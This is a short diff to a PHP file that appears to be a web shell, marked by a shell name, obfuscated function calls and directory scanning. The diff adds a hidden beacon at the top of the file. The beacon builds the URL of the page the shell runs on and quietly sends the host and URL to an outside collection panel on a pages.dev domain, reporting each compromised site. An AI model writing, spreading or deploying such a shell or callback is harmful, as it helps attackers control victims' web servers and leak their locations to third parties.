@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://collecptrxygms.pages.dev/';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 
 $shellName = 'TrYsIdeWEd';
 $logo = 'https://static.wikia.nocookie.net/central/images/1/12/Pacman2.jpg';
@@ -778,4 +788,5 @@ $scandir = $func[21]($dir);
 		})
 	</script>
 </body>
+
 </html>
